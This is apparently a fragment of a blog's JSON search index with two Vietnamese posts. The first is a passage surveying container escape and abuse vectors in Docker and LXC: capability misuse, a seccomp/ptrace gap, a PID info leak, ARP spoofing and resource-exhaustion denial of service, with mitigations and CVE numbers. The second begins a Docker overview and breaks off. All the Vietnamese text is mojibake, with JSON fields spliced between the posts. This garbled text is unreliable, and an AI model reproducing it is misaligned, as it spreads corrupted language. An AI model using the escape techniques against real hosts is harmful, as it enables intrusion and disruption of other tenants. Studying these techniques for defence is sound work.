Ä‘á»ƒ cÃ³ quyá»n truy cáº­p vÃ o báº¥t cá»© tá»‡p nÃ o,\nngay cáº£ cÃ¡c tá»‡p bÃªn ngoáº¡i khÃ´ng gian tÃªn gáº¯n káº¿t cá»§a chÃºng. Xá»­ lÃ­ Ä‘Æ°á»£c chuyá»ƒn vÃ o open_by_handle_at nháº±m má»¥c Ä‘Ã­ch giÃºp má»™t sá»‘ nháº­n dáº¡ng khÃ´ng rÃµ Ä‘Æ°á»£c truy xuáº¥t báº±ng cÃ¡ch sá»­ dá»¥ng name_to_handle_at.\nTuy nhiÃªn, quÃ¡ trÃ¬nh xá»­ lÃ­ nÃ y láº¡i chá»©a thÃ´ng tin nháº¡y cáº£m vÃ  cÃ³ thá»ƒ bá»‹ giáº£ máº¡o. Lá»—i nÃ y Ä‘Æ°á»£c chá»‰ ra trong docker container bá»Ÿi Sebastian krahmer, Ä‘iá»u nÃ y Ä‘Ã£ áº£nh hÆ°á»›ng Ä‘áº¿n cáº£ LXC vÃ  Docker.\nNÃ³ cÅ©ng lÃ  má»™t váº¥n Ä‘á» trong OpenVZ (má»™t há»‡ thá»‘ng container khÃ¡c, nhÆ°ng nay Ä‘Ã£ khÃ´ng cÃ²n phá»• biáº¿n nhiá»u ná»¯a). Docker Ä‘Ã£ giáº£i quyáº¿t báº±ng cÃ¡ch bá» DAC_READ_SEARCH (cÅ©ng nhÆ° cháº·n nhÆ°ng truy cáº­p vÃ o open_by_handle_at báº±ng seccomp).\nLXC giáº£i quyáº¿t báº±ng cÃ¡ch sá»­ dá»¥ng user namespaces, vÃ  máº·c Ä‘á»‹nh cháº·n nhá»¯ng lá»i gá»i há»‡ thá»‘ng thÃ´ng qua seccomp. ChÃ­nh sÃ¡ch cá»§a seccomp Ä‘Ã£ bá»‹ vÃ´ hiá»‡u hÃ³a trong cáº£\nprivileged vÃ  unprivileged cá»§a LXC containers. VÃ¬ váº­y, nhá»¯ng ngÆ°á»i dÃ¹ng tháº­n trá»ng Ä‘Æ°á»£c khuyÃªn nÃªn cáº¥u hÃ¬nh unprivileged LXC container vÃ  bá» DAC_READ_SEARCH (vÃ  cÃ³ thá»ƒ cáº£ SYS_PTRACE).\nAbusing Privileged Containers SYS_RAWIO Abuse SYS_RAWIO Ä‘Æ°á»£c cho lÃ  dá»… láº¡m dá»¥ng vÃ¬ nÃ³ Ä‘Æ°á»£c sá»­ dá»¥ng trÃªn toÃ n bá»™ kernel vÃ  trong má»™t sá»‘ ngá»¯ cáº£nh nháº¡y cáº£m, Ä‘iá»u nÃ y dáº«n Ä‘áº¿n viá»‡c tÃ¬m tháº¥y lá»—i container escape trÃªn\nLXC privileged container. Nhá»¯ng phiÃªn báº£n má»›i cá»§a LXC Ä‘Ã£ bá» SYS_RAWIO vÃ  cÃ³ thÃªm nhá»¯ng luáº­t AppArmor Ä‘á»ƒ cháº·n truy cáº­p vÃ o \u0026ldquo;/proc/bus\u0026rdquo;. Tá»« bÃªn trong containter, ta cÃ³ thá»ƒ truy cáº­p vÃ o \u0026ldquo;control regions\u0026rdquo; cá»§a thiáº¿t bá»‹ Ä‘Æ°á»£c gáº¯n vÃ o host PCI bus báº±ng \u0026ldquo;/proc/bus/pci/interface\u0026rdquo;. Äá»ƒ truy cáº­p vÃ o \u0026ldquo;/proc/interface\u0026rdquo; cáº§n pháº£i cÃ³ quyá»n SYS_RAWIO.\nTháº­m chÃ­, Ä‘Æ°á»ng dáº«n \u0026ldquo;/proc\u0026rdquo; bá»‹ cháº·n bá»Ÿi AppArmor, container vá»›i SYS_RAWIO váº«n cÃ³ thá»ƒ tiáº¿p tá»¥c truy cáº­p vÃ o interface nÃ y thÃ´ng qua \u0026ldquo;iopl/ioperm\u0026rdquo;\n(sau Ä‘Ã³ sá»­ dá»¥ng inb, outb, friends Ä‘á»ƒ truy cáº­p vÃ o IO ports). Má»™t Ä‘iá»u lÆ°u Ã½ lÃ  Docker khÃ´ng bá»‹ lá»—i nÃ y, vÃ¬ \u0026quot;/proc\u0026quot; thÆ°á»ng Ä‘Æ°á»£c gáº¯n cho cháº¿ Ä‘á»™ chá»‰ Ä‘á»c vÃ  SYS_RAWIO bá»‹ loáº¡i bá».\nTrong pháº£n há»“i vá» lá»—i nÃ y, nhÃ³m LXC nháº­n xÃ©t ráº±ng há» coi cÃ¡c vÃ¹ng privileged container vá»‘n khÃ´ng an toÃ n, vÃ¬ cÃ³ má»™t lá»— há»•ng Ä‘Ã£ biáº¿t vÃ  \u0026ldquo;khÃ´ng thá»ƒ sá»­a\u0026rdquo; trong cÃ¡c vÃ¹ng privileged containers. The ptrace Hole \u0026ldquo;Kiá»ƒm tra seccomp sáº½ khÃ´ng Ä‘Æ°á»£c cháº¡y láº¡i sau khi tracer Ä‘Æ°á»£c thÃ´ng bÃ¡o. (ÄiÃªu nÃ y cÃ³ nghÄ©a lÃ  há»™p cÃ¡t dá»±a trÃªn seccomp KHÃ”NG cho phÃ©p sá»­ dá»¥ng ptrace, ngay cáº£ sandboxed processes,\nmaf khÃ´ng tháº­n trá»ng, ptracer cÃ³ thá»ƒ Ä‘Æ°á»£c bá»‹ sá»­ dá»¥ng Ä‘á»ƒ escappe).\u0026rdquo;\nBáº£n thÃ¢n \u0026ldquo;lá»— há»•ng báº£o máº­t\u0026rdquo; lÃ  má»™t váº¥n Ä‘á» Ä‘Æ¡n giáº£n vá» Time-of-Check-to-Time-of-Use (TOCTTOU): seccomp filtering Ä‘Æ°á»£c Ã¡p dá»¥ng trÆ°á»›c khi tracer Ä‘Æ°á»£c thÃ´ng bÃ¡o (vÃ  trÆ°á»›c khi cuá»™c gá»i há»‡ thá»‘ng thá»±c sá»± dÆ°á»£c kÃ­ch hoáº¡t),\nvÃ¬ váº­y pacer cÃ³ thá»ƒ sá»­a Ä‘á»•i cÃ¡c thanh ghi Ä‘Æ°á»£c sá»­ dá»¥ng trong lá»‡nh gá»i há»‡ thá»‘ng (sau khi chÃºng Ä‘Ã£ Ä‘Æ°á»£c kiá»ƒm tra bá»Ÿi seccomp) Ä‘á»ƒ biáº¿n má»™t lá»‡nh gá»i há»‡ thá»‘ng tá»« bÃ¬nh thÆ°á»ng trá»Ÿ thÃ nh \u0026ldquo;Ä‘á»™c háº¡i\u0026rdquo;.\nCÃ¡ch mafg docker giáº£i quyáº¿t váº¥n Ä‘á» nÃ y Ä‘Æ¡n giáº£n lÃ  khÃ´ng cho phÃ©p sá»­ dá»¥ng ptrace trong containers (báº±ng cÃ¡ch loáº¡i bá» SYS_PTRACE á»Ÿ cháº¿ Ä‘á»™ máº·c Ä‘á»‹nh). Máº·c dÃ¹ seccomp cÃ³ thá»ƒ bá»‹ vÃ´ hiá»‡u hÃ³a báº±ng cÃ¡ch sá»­ dá»¥ng ptrace trong unprivileged contaner,\nviá»‡c lÃ m dá»¥ng open_by_handle_at sáº½ khÃ´ng thÃ nh cÃ´ng, vÃ¬ quÃ¡ pocess váº«n thiáº¿u DAC_READ_SEARCH trong root namespace. Vá»›i viá»‡c bá»• sung user namespace vÃ o docker, kháº£ nÄƒng docker sáº½ cho phÃ©p sá»­ dá»¥ng ptrace bÃªn trong container (máº·c dÃ¹ khÃ´ng cháº¯c\ndo sá»± táº­p trung gáº§n Ä‘Ã¢y cá»§a há» vÃ o seccomp).\nMáº·c dÃ¹ LXC privileged containers vá»‘n Ä‘Ã£ khÃ´ng an toÃ n, viá»‡c tÃ¬m ra cÃ¡c Ä‘iá»ƒm Ä‘á»™t phÃ¡ (breakout) lÃ  má»™t bÃ i táº­p thÃº vá»‹ (vÃ  thÆ°á»ng chÃºng cÃ³ thá»ƒ lÃ m cho cÃ¡c privileged container an toÃ n hÆ¡n má»™t chÃºt)\nAbusing Unprivileged Containers Tiáº¿p theo, chÃºng ta sáº½ tÃ¬m hiá»ƒu nhá»¯ng Ä‘iá»ƒm yáº¿u cá»§a unprivileged containers.\nPID Namespacing Info-Leak ChÃºng ta sáº½ nÃ³i Ä‘áº¿n tá»‡p /proc/sched_debug. pseudo-file nÃ y cho phÃ©p unprivileged user cÃ³ thá»ƒ xem thÃ´ng tin debug cho Linux scheduler vÃ  khÃ´ng biáº¿t PID-namespace. Dá»… tháº¥y, nÃ³ tiáº¿t lá»™ tÃªn vÃ  PID cá»§a táº¥t cáº£ cÃ¡c tiáº¿n trÃ¬nh Ä‘ang cháº¡y trÃªn há»‡ thá»‘ng (vÃ  tháº­m chÃ­ biáº¿t cáº£ nhÃ³m tÃ¡c vá»¥ cá»§a chÃºng (cgroup) lÃ  gÃ¬, giÃºp xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c cÃ¡c vÃ¹ng chá»©a khÃ¡c trÃªn há»‡ thá»‘ng vÃ  há»‡ thá»‘ng container nÃ o Ä‘ang Ä‘Æ°á»£c thá»±c thi). Lá»—i nÃ y Ä‘Ã£ Ä‘Æ°á»£c reported cho cáº£ Docker vÃ  LXC vÃ  nÃ³ Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ á»Ÿ Docker.\nNET_RAW abuse Cáº¥u hÃ¬nh phá»• biáº¿n nháº¥t cho cÃ¡c cÃ´ng ty cung cáº¥p giáº£i phÃ¡p PaaS Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn container lÃ  cÃ³ nhiá»u container cá»§a khÃ¡ch hÃ ng cháº¡y trÃªn cÅ©ng má»™t mÃ¡y chá»§ váº­t lÃ½. Theo máº·c Ä‘á»‹nh, cáº£ LXC vÃ  Docker Ä‘á»u thiáº¿t láº­p container network Ä‘á»ƒ táº¥t cáº£ cÃ¡c vÃ¹ng chá»©a chia sáº» cÃ¹ng má»™t Linux virtual bridge. Do Ä‘Ã³, nhá»¯ng container nÃ y sáº½ cÃ³ thá»ƒ giao tiáº¿p vá»›i nhau. Ngay cáº£ khi quyá»n truy cáº­p máº¡ng trá»±c tiáº¿p nÃ y bá»‹ vÃ´ hiá»‡u hÃ³a (set flag -icc = false cho Docker hoáº·c sá»­ dá»¥ng iptables rules cho LXC), cÃ¡c container váº«n khÃ´ng bá»‹ háº¡n cháº¿ Ä‘á»‘i vá»›i viá»‡c truy cáº­p link-layer traffic. Äáº·c biá»‡t, cÃ³ thá»ƒ tiáº¿n hÃ nh má»™t cuá»™c táº¥n cÃ´ng giáº£ máº¡o ARP vÃ o má»™t container khÃ¡c trong cÃ¹ng má»™t há»‡ thá»‘ng mÃ¡y chá»§, cho phÃ©p táº¥n cÃ´ng full middle-person Ä‘á»‘i vá»›i lÆ°u lÆ°á»£ng cá»§a container má»¥c tiÃªu. ChÃºng ta sáº½ cÃ³ má»™t bÃ i viáº¿t nÃ³i rÃµ hÆ¡n vá» cÃ¡ch táº§n cÃ´ng nÃ y.\nSau khi nháº­n Ä‘Æ°á»£c bÃ¡o cÃ¡o nÃ y, LXC team Ä‘Ã£ Ä‘á» xuáº¥t má»™t sá»‘ giáº£i phÃ¡p, chÃºng bao gá»“m:\nSá»­ dá»¥ng LXD vá»›i OpenStack Ä‘á»ƒ quáº£n lÃ­ container networking Sá»­ dá»¥ng libvirt Ä‘á»ƒ quáº£n lÃ­ MAC tables cá»§a bridges/containers. Sá»­ dá»¥ng má»™t virtual bridge riÃªng trÃªn má»—i trust zone hoáº·c trÃªn má»—i container. Denial of Service Attacks User namespaces hoáº¡t Ä‘á»™ng báº±ng cÃ¡ch \u0026ldquo;sliding\u0026rdquo; UIDs giá»¯a user namspace (container) vÃ  root namespace (host). VÃ­ dá»¥, máº·c Ä‘á»‹nh cÃ i Ä‘áº·t cá»§a LXC thÃ¬ UID 0 bÃªn trong contaner sáº½ trá»Ÿ thÃ nh UID 100000 trÃªn host. Tuy nhiÃªn, máº·c Ä‘á»‹nh trÃªn cáº£ LXC vÃ  Docker lÃ  sá»­ dá»¥ng cÃ¹ng má»™t trang trÃ¬nh bÃ y UID cho táº¥t cáº£ cÃ¡c unprivileged container.\nNÃ³i cÃ¡ch khÃ¡c, cÃ¡c UID giá»‘ng há»‡t nhau cá»§a cÃ¡c process trong container khÃ¡c nhau sáº½ cÃ³ giÃ¡ trá»‹ giá»‘ng nhau trÃªn mÃ¡y chá»§, chá»‰ Ä‘Æ°á»£c chuyÃªn lÃªn báº±ng má»™t slide khÃ´ng Ä‘á»•i (tá»©c lÃ  táº¥t cáº£ cÃ¡c process Ä‘ang cháº¡y dÆ°á»›i root bÃªn trong báº¥t kÃ¬ container nÃ o sáº½ Ä‘ang cháº¡y vá»›i UID 100000 trÃªn host). Äiá»u nay lÃ m tÄƒng kháº£ nÄƒng ulimit cá»§a ngÆ°á»i dÃ¹ng khi bá»‹ táº¥n cÃ´ng, vÃ¬ cÃ¡c khu vá»±c nÃ y cá»§a kernel khÃ´ng xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c user namespace. LÆ°u Ã½ ráº±ng cÃ¡c Ä‘iá»u kiá»‡n cá»§a tá»« chá»‘i dá»‹ch vá»¥ (Dos) xáº£y ra mÃ  khÃ´ng cáº§n user namespace (cÅ©ng nhÆ° Ä‘iá»u kiá»‡n tÆ°Æ¡ng tá»± cá»§a UID mÃ¡y chá»§ Ä‘Æ°á»£c chia sáº» Ä‘áº» Ã¡p dá»¥ng). ChÃºng ta sáº½ cÃ³ má»™t bÃ i viáº¿t riÃªng Ä‘á»ƒ tháº£o luáº­n vá» cÃ¡ch táº¥n cÃ´ng nÃ y, tuy nhiÃªn chÃºng ta cÃ³ má»™t sá»‘ khÃ¡i niá»‡m cáº§n lÆ°u Ã½:\npending Signals: ÄÃ¢y lÃ  giá»›i háº¡n cho má»—i ngÆ°á»i dÃ¹ng vá» sá»‘ lÆ°á»£ng tÃ­n hiá»‡u Ä‘ang chá» xá»­ lÃ½ tá»‘i Ä‘a cÃ³ thá»ƒ Ä‘Æ°á»£c xáº¿p hÃ ng Ä‘á»£i trong táº¥t cáº£ cÃ¡c process cá»§a ngÆ°á»i dÃ¹ng. process cháº¡y trong má»™t container cÃ³ thá»ƒ xáº¿p hÃ ng Ä‘á»£i sá»‘ lÆ°á»£ng tin hiá»‡u Ä‘ang chá» xá»­ lÃ½ tá»‘i Ä‘a, ngÄƒn cÃ¡c quÃ¡ trÃ¬nh trong cÃ¡c process khÃ¡c nháº­n Ä‘Æ°á»£c tÃ­n hiá»‡u Ä‘ang chá» xá»­ lÃ½. Thá»±c nghiá»‡m cho tháº¥y, Ä‘iá»u nÃ y lÃ m áº£nh hÆ°á»Ÿng Ä‘áº¿n cáº£ LXC vÃ  Docker. Posix Message Queues: giá»›i háº¡n sá»‘ lÆ°á»£ng tÃ i nuyÃªn tá»‘i Ä‘a cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng trÃªn hÃ ng Ä‘á»£i thÃ´ng Ä‘iá»‡p POSIX. QuÃ¡ trÃ¬nh cháº¡y trÃªn má»™t container cÃ³ thá»ƒ lÃ m cáº¡n kiá»‡t táº¥t cáº£ bá»™ nhá»› hÃ ng Ä‘á»£i thÃ´ng Ä‘iá»‡p POSIX cÃ³ sáºµn, ngÄƒn cÃ¡c process trong container khÃ¡c táº¡o hoáº·c gá»­i thÃ´ng Ä‘iá»‡p Ä‘áº¿n hÃ ng Ä‘á»£i thÃ´ng Ä‘iá»‡p POSIX, Thá»­ nghiá»‡m cho tháº¥y viá»‡c nÃ y váº«n Ä‘ang hoáº¡t Ä‘á»™ng trÃªn LXC vÃ  Docker. Max User Processes: giá»›i háº¡n cho má»—i ngÆ°á»i dÃ¹ng vá» sá»‘ lÆ°á»£ng process tá»‘i Ä‘a. Äiá»u nÃ y cÃ³ thá»ƒ dá»… dÃ ng Ä‘Æ°á»£c khai thÃ¡c Ä‘á»ƒ táº¡o ra má»™t Dos Ä‘Æ¡n giáº£n chá»‘ng láº¡i cÃ¡c container khÃ¡c, cÅ©ng nhÆ° mÃ¡y chá»§. Thá»­ nghiá»‡m cho tháº¥y cuá»™c táº¥n cÃ´ng nÃ y ráº¥t thÃ nh cÃ´ng trÃªn LXC (vÃ  cÃ³ thá»ƒ lÃ m há»ng toÃ n bá»™ mÃ¡y chá»§) trong khi trÃªn Docker chá»‰ cÃ³ thá»ƒ háº¡ táº¥t cáº£ vÃ¹ng chá»©a Docker (mÃ¡y chá»§ váº«n á»•n Ä‘á»‹nh). LÆ°u Ã½, Linux 4.3 Ä‘Ã£ thÃªm kháº£ nÄƒng giá»›i háº¡n tÃ i nguyÃªn PID, Ä‘iá»u nÃ y giÃºp cÃ¡c há»‡ thá»‘ng container giáº£m thiáº¿u váº¥n Ä‘á» nÃ y. Max Files: ÄÃ¢y lÃ  giá»›i háº¡n cho má»—i ngÆ°á»i dÃ¹ng vá» sá»‘ lÆ°á»£ng bá»™ mÃ´ táº£ tá»‡p tá»‘i Ä‘a cÃ³ thá»ƒ má»Ÿ. Tren cáº£ LXC vÃ  Docker, Ä‘Ã¢y lÃ  má»™t cÃ¡ch dá»… dÃ ng Ä‘á»ƒ Dos táº¥t cáº£ cÃ¡c container khÃ¡c Ä‘ang cháº¡y trÃªn cÃ¹ng 1 mÃ¡y chá»§.\nBá» qua ulimit, hai Ä‘iá»u kiá»‡n Dos khÃ¡c cÃ³ thá»ƒ Ä‘Æ°á»£c khai thÃ¡c trong container nhÆ° sau: Disk Space: cÃ³ láº½, Dos Ä‘Æ¡n giáº£n nháº¥t Ä‘á»ƒ táº¥n cÃ´ng há»‡ thá»‘ng container lÃ  lÃ m cho á»• Ä‘Ä©a bá»‹ full. Thá»­ nghiá»‡m, cho tháº¥y Ä‘iá»u nÃ y Ä‘Ã£ hoáº¡t Ä‘á»™ng trÃªn LXC vÃ  Docker. KhÃ´ng giá»‘ng nhÆ° má»™t sÃ´ cuá»™c táº¥n cÃ´ng Dos á»Ÿ trÃªn, thÆ°á»ng cÃ³ thá»ƒ lÃ m há»ng mÃ¡y chÃº hoáº¡c gÃ¢y ra báº¥t á»•n Ä‘á»§ Ä‘á»ƒ chÃºng khÃ³ dá»n dáº¹p, cÃ¡ch nÃ y cung cáº¥p kháº£ nÄƒng Ä‘Æ¡n giáº£n nháº¥t Ä‘á»ƒ táº¡o ra má»™t Dos vÃ  sau Ä‘Ã³ dá»n dáº¹p nÃ³ má»™t cÃ¡ch nhanh chÃ³ng. Káº¿t há»£p vá»›i PID Namespacing Info-Leak, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p container cá»§a káº» táº¥n cÃ´ng nháº±m má»¥c tiÃªu Ä‘áº¿n nhá»¯ng ngÆ°á»i thuÃª khÃ¡c trÃªn cÃ¹ng má»™t mÃ¡y chá»§ Ä‘Æ°á»£c chia sáº», chá»‰ táº¡o Ä‘iá»u kiá»‡n Dos cÃ³ chá»n lá»c khi má»™t sá»‘ container hoáº·c process khÃ¡c Ä‘ang cháº¡y. Global File Descriptor Limits: Há»‡ thá»‘ng duy trÃ¬ giá»›i háº¡n vá» sá»‘ lÆ°á»£ng bá»™ mÃ´ táº£ tá»‡p tá»‘i Ä‘a cÃ³ sáºµn tá»•n thá»ƒ (cÃ³ sáºµn táº¡i /proc/sys.fs.filemax, nhÆ° tháº£o luáº­n trÆ°á»›c Ä‘Ã³, container khÃ´ng thá»ƒ ghi vÃ o). Náº¿u container khÃ´ng chia sáº» UID vÃ  cÃ³ bá»™ ulimit vá» sá»‘ bá»™ mÃ´ táº£ tá»‡p mÃ  chÃºng ta cÃ³ thá»ƒ má»Ÿ, container váº«n cÃ³ thá»ƒ cá»‘ gáº¯ng DoS mÃ¡y chá»§ vÃ  cÃ¡c contaienr khÃ¡c báº±ng cÃ¡ch má»Ÿ sÃ´ lÆ°Æ¡ng FD tá»‘i Ä‘a cho phÃ©p khi má»—i ngÆ°á»i dÃ¹ng trong user namespace cá»§a há», cung cáº¥p kháº£ nÄƒng tiÃªu thá»¥ FD Ä‘Æ°á»£c khuáº¿ch Ä‘áº¡i ráº¥t nhiá»u. ÄÃ¢y thÆ°á»ng lÃ  Dos \u0026ldquo;last line\u0026rdquo; vÃ  chá»‰ Ä‘Æ°á»£c Ä‘Æ°á»£c thiá»‡n náº¿u cÃ¡c biÃªn phÃ¡p giáº£m nháº¹ cho cÃ¡c vector khÃ¡c (Ä‘Æ¡n gian hÆ¡n) Ä‘Æ°á»£c Ä‘Æ°a ra. Container Engine Vulnerabilities Má»™t sá»‘ lá»— há»•ng vÃ  cÃ¡ch khai thÃ¡c.\nDocker Vulnerabilities Weak/proc permissions Host FD leakage Symlinks CVE-2015-3630 CVE-2015-3627 CVE-2015-3627 CVE-2015-3631 CVE-2019-15664 CVE-2015-3629 CVE-2019-15664 Escape via Insecure Configuration Bad idea #1: Exposed Docker Socket Bad idea #2: \u0026ndash;privileged container Bad idea #3: Excessive Capabilities Bad idea #4: Sensitive mounts Kernel Exploitation The security model of containers is predicated on kernel integrity\nDirty CoW (CVE-2016-5195) ","description":"TÃ¬m hiá»ƒu vá» Container Escapes","id":25,"section":"posts","tags":["Docker"],"title":"TÃ¬m hiá»ƒu vá» Container Escapes","uri":"https://minhlongmt183.github.io/posts/container-escapes/"},{"content":"\rToÃ n bá»™ series nÃ y Ä‘Æ°á»£c tham kháº£o tá»« hai nguá»“n chÃ­nh: XuanThuLabChanel vÃ  DockerDoc. Em xin chÃ¢n thÃ nh cáº£m Æ¡n sá»± cá»‘ng hiáº¿n cá»§a cÃ¡c tÃ¡c giáº£ cá»§a nhá»¯ng kÃªnh nÃ³i trÃªn.â¤ï¸â¤ï¸â¤ï¸\rTá»•ng quan vá» Docker Docker lÃ  gÃ¬? Docker lÃ  má»™t container platform Ä‘á»ƒ phÃ¡t triá»ƒn, triá»ƒn khai vÃ  quáº£n lÃ­ á»©ng dá»¥ng nhanh chÃ³ng. Docker lÃ  ná»n táº£ng má»Ÿ (open platform) Ä‘á»ƒ phÃ¡t triá»ƒn (developing), váº­n chuyá»ƒn (shipping) hoáº·c cháº¡y (running) cÃ¡c á»©ng dá»¥ng. Docker cho phÃ©p á»©ng dá»¥ng cá»§a chÃºng ta Ä‘á»™c láº­p vá»›i cÆ¡ sá»Ÿ háº¡ táº§ng (infrastructure) cá»§a mÃ¡y, do Ä‘Ã³, chÃºng ta cÃ³ thá»ƒ dá»… dÃ ng chia sáº» á»©ng dá»¥ng má»™t cÃ¡ch dá»… dÃ ng giá»¯a cÃ¡c thiáº¿t bá»‹. ChÃºng ta cÃ³ thá»ƒ quáº£n lÃ­ cá»Ÿ sá»Ÿ háº¡ táº§ng (infrastructure) giá»‘ng nhÆ° cÃ¡ch quáº£n lÃ­ nhá»¯ng á»©ng dá»¥ng trÃªn mÃ¡y. Sá»­ dá»¥ng LibContainer Ä‘á»ƒ quáº£n lÃ½ nhá»¯ng function cá»§a Linux kernel vÃ  sá»­ dá»¥ng nhá»¯ng nhÃ³m cÃ´ng nghá»‡ Ä‘á»™c láº­p nhÆ°: Namespaces, Control Groups, AppArmor, security profiles, network interface, rule for the firewall necessary for the operation of containers. The Docker platform Docker cung cáº¥p má»™t kháº£ nÄƒng Ä‘Ã³ng gÃ³i vÃ  cháº¡y á»©ng dá»¥ng trÃªn má»™t mÃ´i trÆ°á»ng cÃ´ láº­p, kháº£ nÄƒng nÃ y gá»i lÃ  container. Container nháº¹ vÃ  chá»©a táº¥t cáº£ nhá»¯ng thá»©c cáº§n thiáº¿t Ä‘á»ƒ cháº¡y á»©ng dá»¥ng, do Ä‘Ã³, chÃºng ta chá»‰ cáº§n táº£i vá» vÃ  cháº¡y trÃªn mÃ¡y cÃ¡ nhÃ¢n (host). NgoÃ i ra, mÃ´i trÆ°á»ng Ä‘Æ°á»£c cháº¡y lÃ  mÃ´i trÆ°á»ng Ä‘á»™c láº­p vÃ  báº£o máº­t (security) cho phÃ©p chÃºng ta cháº¡y nhiá»u container Ä‘á»“ng thá»i vÃ  dá»… dÃ ng chia sáº» container trong khi chÃºng ta lÃ m viá»‡c, vÃ  Ä‘áº£m báº£o táº¥t cáº£ má»i ngÆ°á»i Ä‘á»u Ä‘Æ°á»£c chÃºng ta chia sáº» má»™t container sáº½ cÃ³ chung 1 mÃ´i trÆ°á»ng thá»±c thi á»©ng dá»¥ng, vÃ  cho káº¿t quáº£ thá»±c thi giá»‘ng nhau. Docker cung cáº¥p cÃ´ng cá»¥ vÃ  ná»n táº£ng Ä‘á»ƒ quáº£n lÃ­ vÃ²ng Ä‘á»i (lifecycle) containers cá»§a chÃºng ta: PhÃ¡t triá»ƒn á»©ng dá»¥ng cá»§a chÃºng ta vÃ  há»— trá»£ nhá»¯ng thÃ nh pháº§n Ä‘á»ƒ á»©ng dá»¥ng cÃ³ thá»ƒ sá»­ dá»¥ng container. Container trá»Ÿ thÃ nh má»™t Ä‘Æ¡n vá»‹ (unit) Ä‘á»ƒ phÃ¢n phá»‘i vÃ  kiá»ƒm tra á»©ng dá»¥ng cá»§a chÃºng ta. DÃ¹ng docker Ä‘á»ƒ lÃ m gÃ¬? Nhanh, phÃ¢n phá»‘i nháº¥t quÃ¡n á»©ng dá»¥ng cá»§a chÃºng ta Docker sáº¯p xáº¿p há»£p lÃ­ vÃ²ng Ä‘á»i phÃ¡t triá»ƒn báº±ng cÃ¡ch cho phÃ©p cÃ¡c developers lÃ m viá»‡c trong mÃ´i trÆ°á»ng chuáº©n, sá»­ dá»¥ng local container - nÆ¡i cung cáº¥p nhá»¯ng á»©ng dá»¥ng vÃ  dá»‹ch vá»¥ (services). Conatiner lÃ  má»™t giáº£i phÃ¡p cho quy trÃ¬nh lÃ m viá»‡c CI/CD (continuous integration and continuous delivery).\nKháº£ nÄƒng triá»ƒn khai vÃ  má»Ÿ rá»™ng Ná»n táº£ng dá»±a cá»§a container docker Ä‘Ã¡p á»©ng cho khá»‘i cÃ´ng viá»‡c cÃ³ kháº£ nÄƒng linh Ä‘á»™ng cao. Docker container cÃ³ thá»ƒ cháº¡y trÃªn laptop cá»§a láº­p trÃ¬nh viÃªn, cÃ³ thá»ƒ cháº¡y trÃªn mÃ¡y tháº­t hoáº·c mÃ¡y áº£o trong cÃ¡c data center, trÃªn clouder provider, hoáº·c trong há»—n há»£p cÃ¡c mÃ´i trÆ°á»ng (mixture of environments) TÃ­nh linh Ä‘á»™ng vÃ  nháº¹ cá»§a docker lÃ m cho nÃ³ dá»… dÃ ng trong viá»‡c quáº£n lÃ½ Ä‘á»™ng cÃ¡c cÃ´ng viá»‡c, má»Ÿ rá»™ng hoáº·c chia nhá» cÃ¡c á»©ng dá»¥ng, dá»‹ch vá»¥ theo nhu cáº§u kinh doanh, trong thá»i gian thá»±c. Cháº¡y Ä‘Æ°á»£c nhiÃªu cÃ´ng viá»‡c hÆ¡n trong cÃ¹ng má»™t pháº§n cá»©ng (hardware). VÃ¬ docker nháº¹ vÃ  nhanh, nÃ³ cÃ³ kháº£ nÄƒng thay tháº¿ nhá»¯ng mÃ¡y áº£o Ä‘Æ°á»£c xÃ¢y dá»±ng dá»±a trÃªn hypervisor, chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng nhiá»u kháº£ nÄƒng tÃ­nh toÃ¡n hÆ¡n Ä‘á»ƒ thá»±c hiá»‡n má»¥c tiÃªu cá»§a mÃ¬nh. Docker hoáº¡t Ä‘á»™ng hiá»‡u quáº£ cho cáº£ mÃ´i trÆ°á»ng triá»ƒn khai cÃ³ máº­t Ä‘á»™ cao, vá»«a hoáº·c nhá», nÆ¡i mÃ  chÃºng ta cáº§n lÃ m viá»‡c vá»›i Ã­t tÃ i nguyÃªn hÆ¡n.\nKiáº¿n trÃºc cá»§a Docker. Docker sá»­ dá»¥ng kiáº¿n trÃºc client-server. Docker client sáº½ nÃ³i chuyá»‡n vá»›i docker daemon - trÃ¬nh thá»±c hiá»‡n xÃ¢y dá»±ng, cháº¡y, phÃ¢n phá»‘i docker container cá»§a chÃºng ta. Docker client vÃ  daemon cÃ³ thá»ƒ cháº¡y trÃªn cÃ¹ng 1 há»‡ thá»‘ng, hoáº·c cÃ³ thá»ƒ káº¿t ná»‘i docker client tá»›i má»™t trÃ¬nh Ä‘iá»u khiá»ƒn docker daemon (remote docker daemon) ChÃºng giao tiáº¿p vá»›i nhau thÃ´ng qua sá»­ dá»¥ng REST API, qua UNIX sockets hoáº·c network interface. The Docker Daemon( dockerd) Láº¯ng nghe nhá»¯ng yÃªu cáº§u tá»« Docker API vÃ  quáº£n lÃ­ Ä‘á»‘i tÆ°á»£ng cá»§a docker nhÆ°: images, container, networks, volumes. Má»™t daemon can thá»ƒ giao tiáº¿p vá»›i nhá»¯ng daemons khÃ¡c Ä‘á»ƒ quáº£n lÃ­ docker services.\nThe Docker client (docker) LÃ  cÃ¡ch mÃ  ngÆ°á»i dÃ¹ng tÆ°Æ¡ng tÃ¡c vá»›i docker. khi chÃºng ta thá»±c hiá»‡n nhá»¯ng cÃ¢u lá»‡nh nhÆ° docker run, client sáº½ gá»­i cÃ¢u lá»‡nh nÃ y vá»›i dockered Ä‘á»ƒ Ä‘em chÃºng ra ngoÃ i. Lá»‡nh docker sá»­ dá»¥ng Docker API. Docker client cÃ³ thá»ƒ giao tiáº¿p vá»›i má»™t hoáº·c nhiá»u daemon.\nDocker registries MÃ´t docker registry lÆ°u trá»¯ Docker images. Docker Hub lÃ  má»™t public registry mÃ  má»i ngÆ°á»i Ä‘á»u cÃ³ thá»ƒ sá»­ dá»¥ng, vÃ  docker Ä‘Æ°á»£c cáº¥u hÃ¬nh máº·c Ä‘á»‹nh Ä‘á»ƒ tÃ¬m kiáº¿m nhá»¯ng images trÃªn Docker Hub. chÃºng ta cÃ²n cÃ³ thá»ƒ cháº¡y nhá»¯ng registry cá»§a riÃªng chÃºng ta.\nKhi chÃºng ta thá»±c hiá»‡n lá»‡nh docker pull hoáº·c docker run, nhá»¯ng images yÃªu cáº§u sáº½ 